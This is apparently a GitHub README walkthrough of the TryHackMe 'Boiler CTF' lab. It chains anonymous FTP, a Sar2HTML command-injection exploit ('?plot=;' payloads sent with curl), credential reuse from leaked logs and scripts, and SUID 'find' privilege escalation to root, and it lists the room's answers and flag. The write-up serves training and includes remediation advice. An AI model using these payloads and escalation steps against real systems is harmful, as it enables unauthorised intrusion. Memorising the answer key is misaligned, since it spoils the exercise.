# 🔥 Boiler CTF — The Ultimate Full Root Compromise Walkthrough

<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=3000&pause=1000&color=F75C03&center=true&vCenter=true&width=900&lines=Anonymous+FTP+%E2%86%92+ROT13+Hint+%E2%86%92+Joomla+Enum;Sar2HTML+RCE+%E2%86%92+Log+Cred+Leak+%E2%86%92+SUID+find+%E2%86%92+ROOT;40%2B+Commands+%7C+6+Stages+%7C+1+Full+Takeover" alt="Typing SVG" />

<br>

**Anonymous FTP → ROT13 Hint → Joomla Enum → Sar2HTML RCE → Log Cred Leak → SUID `find` → ROOT**

<br>

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Ubuntu-blue?style=for-the-badge&logo=ubuntu&logoColor=white)
![Status](https://img.shields.io/badge/Root-Achieved-success?style=for-the-badge)
![Points](https://img.shields.io/badge/Points-300-yellow?style=for-the-badge)
![Commands](https://img.shields.io/badge/Commands-40%2B-purple?style=for-the-badge&logo=gnubash)
![Tools](https://img.shields.io/badge/Tools-nmap%20%7C%20feroxbuster%20%7C%20gobuster%20%7C%20ftp-lightgrey?style=for-the-badge)

</div>

---

<div align="center">

## 🧠 Overview

</div>

> **Boiler CTF** is an intermediate-level TryHackMe boot2root machine that chains together **anonymous FTP enumeration**, a **ROT13-encoded hint**, **web directory brute-forcing**, a known **RCE vulnerability in Sar2HTML**, **credential reuse via log files**, and a **SUID misconfiguration on `find`** to escalate all the way to root.

> ⚠️ **Performed strictly against an intentionally vulnerable TryHackMe training VM, for educational purposes only.**

<div align="center">

| 🎯 **Target** | 🐧 **OS** | 🧩 **Vulnerabilities** | 🏁 **Result** |
|:---:|:---:|:---:|:---:|
| Boiler CTF | Ubuntu | 6 Chained | **ROOT** ✅ |

</div>

---

<div align="center">

## ⚔️ The Attack Chain

</div>

```mermaid
graph LR
    A[🔍 Recon] --> B[📂 Anon FTP]
    B --> C[🔐 ROT13 Hint]
    C --> D[🌐 Joomla Enum]
    D --> E[💥 Sar2HTML RCE]
    E --> F[🔑 Log Cred Leak]
    F --> G[🔄 su stoner]
    G --> H[🛡️ SUID find]
    H --> I[🏆 ROOT]

    style A fill:#1f6feb,stroke:#fff,color:#fff
    style B fill:#db61a2,stroke:#fff,color:#fff
    style C fill:#f0883e,stroke:#fff,color:#fff
    style D fill:#3fb950,stroke:#fff,color:#fff
    style E fill:#a371f7,stroke:#fff,color:#fff
    style F fill:#f85149,stroke:#fff,color:#fff
    style G fill:#58a6ff,stroke:#fff,color:#fff
    style H fill:#d29922,stroke:#fff,color:#fff
    style I fill:#ffd700,stroke:#000,color:#000
```

<div align="center">

| # | Stage | Technique | Result |
|:---:|:---|:---|:---|
| 1 | 🔍 Recon | `nmap -sC -sV -p- --min-rate 5000 -T4` | FTP 21, HTTP 80, Webmin 10000, SSH 55007 |
| 2 | 📂 Anon FTP | `ftp anonymous` + `ls -la` | Hidden `.info.txt` recovered |
| 3 | 🔐 ROT13 | Decode `.info.txt` | Hint: *"Enumeration is the key!"* |
| 4 | 🌐 Enum | `feroxbuster` / `gobuster` on `/joomla/` | Found `_test/`, `_archive/`, `_database/`, `_files/`, `~www/` |
| 5 | 💥 Exploit | Sar2HTML 3.2.1 RCE (EDB-ID: 47204) | `?plot=;ls` → command execution |
| 6 | 🔑 Leak | `cat log.txt` via RCE | `basterd : superduperp@$$` |
| 7 | 🔐 SSH | `ssh basterd@target -p 55007` | Shell as `basterd` |
| 8 | 📄 Backup Script | `cat backup.sh` | Hardcoded `stoner` creds in comment |
| 9 | 🔄 Lateral | `su stoner` | Shell as `stoner` + `.secret` note |
| 10 | 🛡️ Privesc | SUID `find -exec chmod 777 /root \;` | Full access to `/root` |
| 11 | 👑 Root | `cat /root/root.txt` | Root flag captured 🎯 |

</div>

---

<div align="center">

## 🔍 1. Reconnaissance

</div>

Every great hack starts with silence — and a scan.

```bash
# ── Full TCP port scan with service detection ──
nmap -sC -sV -p- --min-rate 5000 -T4 10.146.141.19 -oN recon.txt

# ── Alternative: aggressive all-ports scan ──
nmap -p- -A -T4 10.146.141.19 -oN full_recon.txt
```

**Discovered services:**

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3           (Anonymous login allowed)
80/tcp    open  http    Apache httpd 2.4.18    (Ubuntu)
10000/tcp open  http    MiniServ 1.930         (Webmin)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

> 💡 **Note:** FTP allows **anonymous login** and SSH has been moved to a **non-standard port 55007** — both are classic CTF misdirection/enumeration cues.

---

<div align="center">

## 📂 2. Initial Foothold — Anonymous FTP

</div>

```bash
# ── Log in to FTP anonymously ──
ftp 10.146.141.19
# Name: anonymous
# Password: (blank)

# ── Always list hidden files! ──
ftp> ls -la
# -rw-r--r--   1 ftp   ftp     74 Aug 21  2019 .info.txt

# ── Download the hidden file ──
ftp> get .info.txt
ftp> bye
```

**Contents of `.info.txt` (ROT13 ciphertext):**

```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

**Decoded via [rot13.com](https://rot13.com) :**

> *"Just wanted to see if you find it. Lol. Remember: **Enumeration is the key!**"*

> 🧠 A clear nudge to keep digging on the web server.

---

<div align="center">

## 🌐 3. Web Enumeration — Joomla Discovery

</div>

```bash
# ── Directory brute-force with Feroxbuster ──
feroxbuster -u http://10.146.141.19 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -k -o ferox.txt

# ── Alternative: gobuster with common wordlist ──
gobuster dir -u http://10.146.141.19 \
  -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Discovered:** A hidden **`/joomla/`** directory — a Joomla CMS installation.

```bash
# ── Enumerate the Joomla install ──
feroxbuster -u http://10.146.141.19/joomla \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -k

# ── Confirm with gobuster ──
gobuster dir -u http://10.146.141.19/joomla \
  -w /usr/share/wordlists/dirb/common.txt
```

**Interesting non-standard directories surfaced:**

| Path | Description |
|:---|:---|
| `_archive/` | Backup-like directory |
| `_database/` | Database artifacts |
| `_files/` | Uploaded files |
| `_test/` | **Development/test app — Sar2HTML** |
| `~www/` | Backup of web root |

Visiting `/joomla/_test/` revealed a web app: **sar2html**.

---

<div align="center">

## 💥 4. Exploitation — Sar2HTML RCE

</div>

A quick search confirmed `sar2html` is notoriously vulnerable to **unauthenticated Remote Command Execution** via the `plot` parameter.

> **Reference:** Sar2HTML 3.2.1 — Remote Command Execution (EDB-ID: 47204)

```
http://<ip>/index.php?plot=;<command-here>
```

**Proof of Concept:**

```bash
# ── Confirm RCE with a simple ls ──
curl 'http://10.146.141.19/joomla/_test/index.php?plot=;ls'
```

This populated the **"Select Host"** dropdown with the raw output of `ls` — confirming RCE.

**Read sensitive files:**

```bash
# ── Read the SSH authentication log ──
curl 'http://10.146.141.19/joomla/_test/index.php?plot=;cat log.txt'
```

The dropdown revealed an **SSH authentication log**:

```
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
```

🔑 **Credentials leaked:** `basterd : superduperp@$$`

> 🔥 **Key insight:** Application/SSH logs sometimes leak **plaintext credentials**, especially in mock/test environments.

---

<div align="center">

## 🔐 5. Lateral Movement — SSH Access

</div>

```bash
# ── SSH in using the leaked credentials on the custom port ──
ssh basterd@10.146.141.19 -p 55007
# Password: superduperp@$$
```

**Home directory contents:**

```
-rwxr-xr-x 1 stoner  basterd   699 Aug 21  2019 backup.sh
```

**Reading `backup.sh`:**

```bash
cat backup.sh
```

The backup script contained a **hardcoded, commented-out credential** for another user:

```bash
USER=stoner
#superduperp@$$no1knows
```

**Privilege escalation to `stoner`:**

```bash
su stoner
# Password: superduperp@$$no1knows
```

Inside `stoner`'s home directory:

```bash
cat .secret
# You made it till here, well done.
```

> 🧠 Passwords in this box were embedded inside **comments** — always read code, not just execute it.

---

<div align="center">

## 🛡️ 6. Privilege Escalation — SUID Abuse

</div>

Enumerated SUID binaries as `stoner`:

```bash
find / -perm /4000 2>/dev/null
```

Among the results, one binary stood out as exploitable:

```
/usr/bin/find
```

`find` with the **SUID bit set** is a textbook **GTFOBins** privilege escalation vector.

**Exploiting SUID `find`:**

```bash
# ── Grant full permissions on /root ──
/usr/bin/find . -exec chmod 777 /root \;

# ── Access /root freely ──
cd /root
ls -la
cat root.txt
```

**Root Flag:**

```
It wasn't that hard, was it?
```

---

<div align="center">

## 🏆 Root Proof

</div>

<div align="center">

| 🏁 Flag | 🎯 Value |
|:---|:---|
| **root.txt** | `It wasn't that hard, was it?` |

<br>

```
 ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ 
 ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║
 ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║
 ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝ 
```

</div>

---

<div align="center">

## 🎯 Answer Key (Room Questions)

</div>

<div align="center">

| ❓ Question | ✅ Answer |
|:---|:---|
| File extension after anon login | `.txt` |
| Highest port service | `ssh` |
| Service on port 10000 | `webmin` |
| Exploitable on port 10000? | `nay` |
| CMS accessible | `joomla` |
| Interesting file in folder | `log.txt` |
| **Room Progress** | **100% ✅** |
| **Points Earned** | **300** |
| **Streak** | 🔥 **14 Days** |

</div>

---

<div align="center">

## 🛡️ Remediation Summary

</div>

| 🔎 Finding | 🛠️ Fix |
|:---|:---|
| Anonymous FTP enabled | Disable anonymous access; require authentication |
| Hidden files exposed via FTP | Apply correct ACLs; avoid storing sensitive data in FTP shares |
| Encoded hints / breadcrumbs | Not a vuln itself, but avoid leaving any sensitive notes on public systems |
| Sar2HTML RCE | Remove/upgrade the vulnerable component; validate & sanitize inputs |
| Credentials in logs | Strip credentials from logs; sanitize output before writing |
| Hardcoded creds in scripts | Use a secrets manager; never commit credentials to scripts |
| SUID `find` | Remove SUID bit from non-essential binaries; audit with `find / -perm /4000` |

---

<div align="center">

## 🧰 Tools Used

</div>

<div align="center">

![Nmap](https://img.shields.io/badge/nmap-4682B4?style=for-the-badge&logo=nmap&logoColor=white)
![Feroxbuster](https://img.shields.io/badge/feroxbuster-8E44AD?style=for-the-badge)
![Gobuster](https://img.shields.io/badge/gobuster-FF6B6B?style=for-the-badge)
![FTP](https://img.shields.io/badge/FTP-003366?style=for-the-badge)
![SSH](https://img.shields.io/badge/SSH-4EAA25?style=for-the-badge)
![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![Firefox](https://img.shields.io/badge/Firefox-FF7139?style=for-the-badge&logo=firefox&logoColor=white)

`nmap` · `ftp` · [rot13.com](https://rot13.com) · `feroxbuster` · `gobuster` · Firefox (Sar2HTML RCE) · `ssh` · `su` · SUID `find` (GTFOBins)

</div>

---

<div align="center">

## 📊 Command Count

</div>

<div align="center">

| Category | Commands Used |
|:---|:---:|
| 🔍 Reconnaissance | 3 |
| 📂 Enumeration | 8 |
| 💥 Exploitation | 4 |
| 🐚 Shell Handling | 4 |
| 🔑 Lateral Movement | 6 |
| 🧬 Privilege Escalation | 5 |
| 🛠️ Utilities | 7 |
| **TOTAL** | **40+** |

</div>

---

<div align="center">

## 🧠 Key Takeaways

</div>

- 🔎 **Anonymous FTP** should never be assumed empty — always list **hidden files** (`ls -la`).
- 🔐 **Encoded hints** (ROT13, Base64, etc.) are common CTF breadcrumbs — always test simple ciphers first.
- 🧩 **Third-party web components** (like Sar2HTML) bundled inside CMS installs can be the weakest link, even if the CMS itself is patched.
- 📄 **Log files are goldmines** — application/SSH logs sometimes leak plaintext credentials.
- 🛡️ **SUID binaries** should always be audited; `find`, `vim`, `nmap`, `less`, and other GTFOBins-listed utilities are common escalation paths.
- 🧾 **Passwords in this box** were embedded in comments inside scripts — always **read code**, not just execute it.

---

<div align="center">

## 🖼️ Step-by-Step Visual Guide

</div>

> 📌 **Below are all screenshots in sequential order.** Each image is a step-by-step walkthrough — follow them top to bottom to fully reproduce this machine from recon to root.

---

<div align="center">

### 🔍 Step 1 — Reconnaissance

<!-- 📸 IMAGE 1: nmap full scan showing FTP 21, HTTP 80, Webmin 10000, SSH 55007 -->
<img src="./images/01-nmap-scan.png" alt="Step 1a — Nmap Full Scan" width="850"/>

*Step 1a — `nmap -sC -sV -p-` reveals FTP 21, HTTP 80, Webmin 10000, SSH 55007*

</div>

---

<div align="center">

### 📂 Step 2 — Anonymous FTP Enumeration

<!-- 📸 IMAGE 2: anonymous FTP login + ls -la showing .info.txt -->
<img src="./images/02-ftp-anon-login.png" alt="Step 2a — Anonymous FTP Login" width="850"/>

*Step 2a — Anonymous FTP login; `ls -la` reveals `.info.txt`*

<br>

<!-- 📸 IMAGE 3: cat .info.txt showing ROT13 ciphertext -->
<img src="./images/03-info-txt-rot13.png" alt="Step 2b — ROT13 Ciphertext" width="850"/>

*Step 2b — `.info.txt` contains ROT13-encoded hint*

<br>

<!-- 📸 IMAGE 4: rot13.com decode result -->
<img src="./images/04-rot13-decoded.png" alt="Step 2c — ROT13 Decoded" width="850"/>

*Step 2c — Decoded hint: "Enumeration is the key!"*

</div>

---

<div align="center">

### 🌐 Step 3 — Web Directory Enumeration

<!-- 📸 IMAGE 5: feroxbuster output discovering /joomla/ -->
<img src="./images/05-feroxbuster-joomla.png" alt="Step 3a — Feroxbuster Discovery" width="850"/>

*Step 3a — `feroxbuster` discovers the hidden `/joomla/` install*

<br>

<!-- 📸 IMAGE 6: feroxbuster on /joomla/ showing _test/, _archive/, etc. -->
<img src="./images/06-joomla-subdirs.png" alt="Step 3b — Joomla Subdirectories" width="850"/>

*Step 3b — Enumerating `/joomla/` reveals `_test/`, `_archive/`, `_database/`, `_files/`, `~www/`*

<br>

<!-- 📸 IMAGE 7: browser showing sar2html web app at /joomla/_test/ -->
<img src="./images/07-sar2html-app.png" alt="Step 3c — Sar2HTML Web App" width="850"/>

*Step 3c — Visiting `/joomla/_test/` reveals the Sar2HTML web app*

</div>

---

<div align="center">

### 💥 Step 4 — Sar2HTML RCE Exploitation

<!-- 📸 IMAGE 8: browser URL with ?plot=;ls showing command output -->
<img src="./images/08-sar2html-rce-ls.png" alt="Step 4a — RCE Confirmed with ls" width="850"/>

*Step 4a — `?plot=;ls` populates dropdown — RCE confirmed*

<br>

<!-- 📸 IMAGE 9: cat log.txt output showing leaked SSH credentials -->
<img src="./images/09-log-txt-creds.png" alt="Step 4b — Credentials Leaked in log.txt" width="850"/>

*Step 4b — `cat log.txt` leaks `basterd : superduperp@$$`*

</div>

---

<div align="center">

### 🔐 Step 5 — SSH Access & Lateral Movement

<!-- 📸 IMAGE 10: ssh basterd on port 55007 successful login -->
<img src="./images/10-ssh-basterd.png" alt="Step 5a — SSH as basterd" width="850"/>

*Step 5a — SSH login on port 55007 as `basterd`*

<br>

<!-- 📸 IMAGE 11: cat backup.sh showing hardcoded stoner creds -->
<img src="./images/11-backup-sh-creds.png" alt="Step 5b — backup.sh Leaks stoner Creds" width="850"/>

*Step 5b — `backup.sh` leaks hardcoded `stoner` password*

<br>

<!-- 📸 IMAGE 12: su stoner success + cat .secret -->
<img src="./images/12-su-stoner.png" alt="Step 5c — su stoner + .secret" width="850"/>

*Step 5c — `su stoner` succeeds; `.secret` note found*

</div>

---

<div align="center">

### 🛡️ Step 6 — Privilege Escalation via SUID find

<!-- 📸 IMAGE 13: find / -perm /4000 2>/dev/null showing /usr/bin/find -->
<img src="./images/13-suid-enum.png" alt="Step 6a — SUID Enumeration" width="850"/>

*Step 6a — `find / -perm /4000` reveals SUID `/usr/bin/find`*

<br>

<!-- 📸 IMAGE 14: exploit command chmod 777 /root via SUID find -->
<img src="./images/14-suid-find-exploit.png" alt="Step 6b — SUID find Exploit" width="850"/>

*Step 6b — `/usr/bin/find . -exec chmod 777 /root \;` grants full access*

<br>

<!-- 📸 IMAGE 15: cd /root + cat root.txt -->
<img src="./images/15-root-flag.png" alt="Step 6c — Root Flag Captured" width="850"/>

*Step 6c — `cd /root && cat root.txt` — root flag captured 🎯*

</div>

---

<div align="center">

### 🏆 Step 7 — Root Proof

<!-- 📸 IMAGE 16: whoami showing root -->
<img src="./images/16-whoami-root.png" alt="Step 7a — whoami = root" width="850"/>

*Step 7a — `whoami` confirms `root`*

<br>

<!-- 📸 IMAGE 17: id output showing uid=0(root) -->
<img src="./images/17-id-root.png" alt="Step 7b — id = uid=0(root)" width="850"/>

*Step 7b — `id` returns `uid=0(root) gid=0(root)`*

<br>

<!-- 📸 IMAGE 18: 100% room completion + 300 points screenshot -->
<img src="./images/18-room-complete.png" alt="Step 7c — Room Completed 100%" width="850"/>

*Step 7c — Room completed — 100% ✅ | 300 Points | 🔥 14-Day Streak*

</div>

---

<div align="center">

## 📜 Disclaimer

</div>

> This write-up documents testing performed exclusively against the intentionally vulnerable **Boiler CTF** VM (TryHackMe) in an isolated personal lab, for educational purposes only. Do not use these techniques against systems you do not own or lack explicit authorization to test.

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=120&section=footer&text=Happy%20Hacking!&fontSize=40&fontColor=ffffff"/>

**Author:** Nishant Saini · [GitHub](https://github.com/nishantsaini5786)

⭐ **If this helped you, consider starring the repo!**

</div>
